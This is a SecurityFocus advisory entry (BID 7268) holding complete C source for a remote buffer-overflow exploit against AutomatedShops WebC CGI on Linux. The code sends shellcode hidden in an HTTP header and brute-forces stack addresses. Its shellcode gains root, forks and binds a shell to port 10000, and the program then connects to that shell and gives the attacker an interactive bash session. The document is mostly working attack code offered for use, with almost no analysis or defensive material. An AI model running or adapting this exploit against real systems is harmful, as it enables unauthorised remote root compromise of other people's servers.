source: http://www.securityfocus.com/bid/7268/info

It has been reported that a boundary condition error exists in WebC. Because of this, it may be possible for a remote attacker to gain unauthorized access to a vulnerable host. 

/*
 AutomatedShops WebC 2.011 -> 5.005 remote exploit.
 By Carl Livitt 16/Feb/2003

 ** BugTraq release - Linux only **

 Usage:

    ./webc-exploit -t HOSTNAME

*/
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <netdb.h>
#include <time.h>

/*
 * Play with these to make it work (if it fails!)
 */
#define RET_ADDR_START	0xbfffe949
#define RET_ADDR_END	0xbffff850
#define RET_ADDR_INCR	768
#define EBP_ADDR_START 	0xbfffe84c
#define EBP_ADDR_END	0xbffff852
#define EBP_ADDR_INCR	768
#define ROOT_SHELL_PORT 10000
#define COMMAND1 "id\n"
#define COMMAND2 "uname -a\n"

// don't adjust this
#define BUF_SIZE 2048

void make_shellcode(int);
void make_exploit_buffer();
void make_boundary_buffer();

char shellcode[] =
	// setuid(0),setgid(0)... (just in case ;)
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xb0\x2e\xcd\x80"

	// ...fork(). Parent terminates, killing webc.cgi but
	// leaving child process as a daemon...
	"\x31\xc0\xb0\x02\xcd\x80\x89\xc3\x85\xdb\x74\x08\x31\xdb\x31\xc0"
	"\xb0\x01\xcd\x80"

	// ...finally, bind shell (/bin/sh) to port 10000 (by default).
	// This is a butchered version of port-binding shellcode by
	// BigHawk.
        "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
        "\x89\xc7\x52\x66\x68"
        "XX" // XX is port number - gets filled in later
        "\x43\x66\x53\x89\xe1\xb0\x10\x50\x51"
        "\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50\x57"
        "\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
        "\x41\xe2\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
        "\x51\x53\x89\xe1\xb0\x0b\xcd\x80";

char sc[BUF_SIZE*2+2];
char exploit_buf[100000];
char target[256];
int port=80;
char orig_location[4096]="/cgi-bin/webc.cgi/g/", location[100000];
unsigned long RET_ADDR, EBP_ADDR;
int root_shell_port=ROOT_SHELL_PORT,padding,len, PADDING, ORDER, repeat;

char usage[]=
"Options:\n"
"-h           This cruft\n"
"-t hostname  Specify target host\n"
"-a n         Add extra padding, start at value 'n'\n"
"-A n         Add extra padding, stop at value 'n'\n\n"
"Usage:\n\n"
" ./webc-exploit -t localhost\n\n"
"Should work on any WebC installation (versions 5.001 - 5.005)\n\n";

char greeting[]=
"WebC 5.00x proof-of-concept exploit for Linux\n"
"By Carl Livitt, Feb 2003\n"
"PRIVATE - DO  NOT DISTRIBUTE\n\n";

char thingy[]="|/-\\";

/*
 * The fun begins here...
 */

main(int argc, char **argv) {
	int ch, websock, shellsock,r=1;
	struct hostent *host;
	struct sockaddr_in saddr;
	char buf[8092];
	char cmd[256];
	int tries=0;
	struct timespec sleepTime;
	fd_set rfds;
	int retval, PADDING_START, PADDING_END;
	int thingyCount=0;
		
	printf("%s",greeting);
	PADDING_START=21;
	PADDING_END=21;
	while((ch=getopt(argc,argv,"a:A:ht:p:P:l:"))!=-1) {
		switch(ch) {
			case 'h':
				printf("%s",usage);
				exit(0);
				break;
			case 't':
				strncpy(target, optarg, sizeof(target)-1);
				break;
			case 'a':
				PADDING_START=atoi(optarg);
				break;
			case 'A':
				PADDING_END=atoi(optarg);
				break;
			default:
				printf("%s", usage);
				exit(0);
				break;
		}
	}	
	
	if((host=gethostbyname(target))==NULL) {
		printf("Host not found. Usage:\n%s\n", usage);
		exit(1);
	}
	
	/*
	 * Start the bruteforce loop
	 */
	for(RET_ADDR=RET_ADDR_START; RET_ADDR<RET_ADDR_END; RET_ADDR+=RET_ADDR_INCR) {
		for(EBP_ADDR=EBP_ADDR_START; EBP_ADDR<EBP_ADDR_END; EBP_ADDR+=EBP_ADDR_INCR) {
			for(PADDING=PADDING_START;PADDING<=PADDING_END;PADDING++){
			for(ORDER=0;ORDER<=1;ORDER++) {
			repeat=5;
			while(repeat--) {
			printf("Please wait, this may take a few minutes... %c\r",thingy[thingyCount]);fflush(stdout);
			/*
		 	 * Setup the exploit strings and
	 		 * HTTP headers. The Accept-Encoding header
	 		 * will hold shellcode: it will be passed
	 		 * to the environment of webshell giving us
	 		 * a reasonably predictable RET address.
	 		 */
			make_shellcode(ORDER);
			make_boundary_buffer();
			make_exploit_buffer();
		
			/*
	 		 * Now connect to the host and send the exploit
	 		 * string...
	 		 */
			if((websock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1) {
				perror("socket()");
				exit(1);
			}
			memset((void *)&saddr, 0, sizeof(struct sockaddr_in));
			saddr.sin_family=AF_INET;
			saddr.sin_addr.s_addr=*((unsigned long *)host->h_addr_list[0]);
			saddr.sin_port=htons(port);
			if(connect(websock, (struct sockaddr *)&saddr, sizeof(saddr))<0) {
				perror("connect()");
				exit(1);
			}
			send(websock, exploit_buf, strlen(exploit_buf), 0);
			//len=recv(websock, buf, sizeof(buf)-1, 0);
			close(websock);
			
			// increment the counters 
			tries++;
			if((++thingyCount)==4)
				thingyCount=0;

			// attempt to connect to port 10000 (or other, non-default port).
			// If successful, we know the exploit succeeded.
			if((shellsock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1) {
                                perror("socket()");
                                exit(1);
                        }
                        memset((void *)&saddr, 0, sizeof(struct sockaddr_in));
                        saddr.sin_family=AF_INET;
                        saddr.sin_addr.s_addr=*((unsigned long *)host->h_addr_list[0]);
                        saddr.sin_port=htons(root_shell_port);
                        if(connect(shellsock, (struct sockaddr *)&saddr, sizeof(saddr))==0)
                                goto CONNECTED; // goto? Damn amateurs...
                        close(shellsock);
			EBP_ADDR--;
			} // repeat
			} // ORDER
			} // PADDING
		} // EBP_ADDR
	} // RET_ADDR
	/*
	 * If we get here, then the bruteforce was exhausted without a
	 * succesful exploit.
	 */
	printf("Exploit failed.\n");
	exit(0);

CONNECTED:
        /*
         * We're now connected to the remote host. Issue
         * some commands... ('id' and 'uname -a' by default)
         */
        printf("\n------------------------------------\nExploit successful!\n");
	printf("Explit values were:\n");
	printf("RET:0x%08x, EBP_ADDR:0x%08x, PADDING:%d, tries:%d, ORDER:%d, repeat:%d\n", RET_ADDR, EBP_ADDR, PADDING,tries,ORDER,repeat);
	printf("--------------------------------------\nIssuing some commands...\n\n");
        if(send(shellsock, COMMAND1, strlen(COMMAND1), 0)==-1) {
                perror("send()");
                exit(1);
        }
        buf[recv(shellsock, buf, sizeof(buf)-1, 0)]='\0';
        printf("%s", buf);
        send(shellsock, COMMAND2, strlen(COMMAND2), 0);
        buf[recv(shellsock, buf, sizeof(buf)-1, 0)]='\0';
        printf("%s\n", buf);
        printf("You are now at a bash prompt...\n");
        send(shellsock, "export TERM=vt100; exec bash -i\n",strlen("export TERM=vt100; exec bash -i\n"),0);

        /*
         * Now let the attacker issue commands to the remote
         * shell, just as if (s)he had launched 'nc host 10000'.
         * Note the dodgy coding of assigning NULLs to the buf[]
         * array. What would happen if recv() or read() returned -1 ?
         */
        do {
                FD_ZERO(&rfds);
                FD_SET(0, &rfds);
                FD_SET(shellsock, &rfds);
                retval=select(shellsock+1, &rfds, NULL, NULL, NULL);
                if(retval) {
                        if(FD_ISSET(shellsock, &rfds)) {
                                buf[(r=recv(shellsock, buf, sizeof(buf)-1,0))]='\0';
                                printf("%s", buf);
                        }
                        if(FD_ISSET(0, &rfds)) {
                                buf[(r=read(0, buf, sizeof(buf)-1))]='\0';
                                send(shellsock, buf, strlen(buf), 0);
                        }

                }
        } while(retval && r); // loop until connection terminates
        close(shellsock);
        exit(0);
}	

/*
 * Create the HTTP request that will setup the exploit
 * conditions in webshell. Shellcode is stored in the 
 * Accept-Encoding HTTP header.
 */
void make_exploit_buffer() {
	sprintf(exploit_buf,"GET %s HTTP/1.1\n",location);
	sprintf(exploit_buf,"%sHost: %s\n",exploit_buf,target);
	sprintf(exploit_buf,"%sAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1\n", exploit_buf);
	sprintf(exploit_buf,"%sAccept-Language: en-gb, en;q=0.66, en-us;q=0.33\n", exploit_buf);
	sprintf(exploit_buf,"%sAccept-Encoding: gzip, deflate, compress;q=0.9\n", exploit_buf);
	sprintf(exploit_buf,"%sAccept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66\n", exploit_buf);
	sprintf(exploit_buf,"%sCookie: ck_ams=00000; ck_amsv=11043763620; ck_sid=3J4EUD0l4Juf1ev-06103517452.aa\n", exploit_buf);
	sprintf(exploit_buf,"%sAccept-Encoding: %s\n\n",exploit_buf, sc);
	//printf("%s\n\n", exploit_buf);
}

/*
 * Create the buffer that overflows the stack...
*/ 
void make_boundary_buffer() {
	int i;
	char *ptr;
	const int MAGIC=59;
	
	memset(location, 0, sizeof(location));
	strcpy(location, orig_location);
	ptr=location;
	while(*ptr)
		++ptr;
	i=PADDING%4;
	while(i--)
		*(ptr++)=0xbf;	
	i=MAGIC+(PADDING/4)-4;
	while(i--) {
		*(ptr++)=EBP_ADDR&0xff;
	        *(ptr++)=(EBP_ADDR>>8)&0xff;
        	*(ptr++)=(EBP_ADDR>>16)&0xff;
	        *(ptr++)=(EBP_ADDR>>24)&0xff;
	}
	*(ptr++)=RET_ADDR&0xff;
        *(ptr++)=(RET_ADDR>>8)&0xff;
       	*(ptr++)=(RET_ADDR>>16)&0xff;
        *(ptr++)=(RET_ADDR>>24)&0xff;
	*ptr='\0';
}

/*
 * Creates a buffer holding NOPs and shellcode.
 */
void make_shellcode(int order) {
	char *ptr;
	int i;

	// Finish making shellcode buffer
	memset(sc, 0x90,BUF_SIZE);
	memcpy(sc + BUF_SIZE - (strlen(shellcode)+1), shellcode, strlen(shellcode));

	// Fill in the port number
	ptr=strstr(sc, "XX");
	*(ptr++)=htons(root_shell_port)&0xff;
	*ptr=(htons(root_shell_port)>>8)&0xff;

	ptr=(char *)sc+BUF_SIZE;
	for(i=0;i<BUF_SIZE-4;i+=4) {
		switch(order) {
			case 0:
				*(ptr++)=RET_ADDR&0xff;
			        *(ptr++)=(RET_ADDR>>8)&0xff;
			        *(ptr++)=(RET_ADDR>>16)&0xff;
			        *(ptr++)=(RET_ADDR>>24)&0xff;	
				break;
			case 1:
				*(ptr++)=(RET_ADDR>>16)&0xff;
			        *(ptr++)=(RET_ADDR>>24)&0xff;	
				*(ptr++)=RET_ADDR&0xff;
			        *(ptr++)=(RET_ADDR>>8)&0xff;
				break;
		}
	}
	*ptr='\0';
}